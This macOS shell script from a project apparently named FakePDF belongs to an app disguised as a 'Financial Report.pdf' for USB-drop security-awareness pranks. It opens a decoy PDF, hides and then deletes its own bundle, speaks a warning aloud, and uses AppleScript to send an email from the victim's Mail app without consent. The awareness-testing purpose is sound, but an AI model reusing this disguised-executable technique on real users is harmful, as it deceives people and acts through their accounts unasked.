#!/bin/sh

#  cleanup.sh
#  FakePDF
#
#  Created by Yoann Gini on 17/06/2016.
#  Copyright © 2016 Yoann Gini. All rights reserved.

pdfFileName="Financial Report.pdf"

function customBehavior {
	osascript -e "set Volume 10"

	say "You shouldn't use a USB stick found on the ground"

	# Use -v Thomas for french voice

	# Send mail with Apple Mail, adapt to use with Outlook
	echo "tell application \"Mail\"" > /tmp/hack.mail
	echo "set my_message to make new outgoing message" >> /tmp/hack.mail
	echo "set subject of my_message to \"Breakfast is for me tomorrow\"" >> /tmp/hack.mail
	echo "set content of my_message to \"Shame on me! I've just found a USB stick on the ground and used it on my computer even if I know this is really really BAD. As an appology for my fault I bring everytihng for a team breakfast tomorrow.\"" >> /tmp/hack.mail
	echo "--" >> /tmp/hack.mail
	echo "tell my_message" >> /tmp/hack.mail
	echo "make new to recipient at end of to recipients with properties {name:\"all@example.com\"}" >> /tmp/hack.mail
	echo "end tell" >> /tmp/hack.mail
	echo "--" >> /tmp/hack.mail
	echo "send my_message" >> /tmp/hack.mail
	echo "end tell" >> /tmp/hack.mail

	osascript /tmp/hack.mail

	rm /tmp/hack.mail
}

#### Don't touch anything below

bundle_path="$1"

working_folder=$(dirname "$bundle_path")
pdf_payload="$bundle_path/Contents/Resources/$pdfFileName"

chflags hidden "$bundle_path"

mv "$pdf_payload" "$working_folder"

open "$working_folder/$pdfFileName"

customBehavior

rm -rf "$bundle_path"

exit 0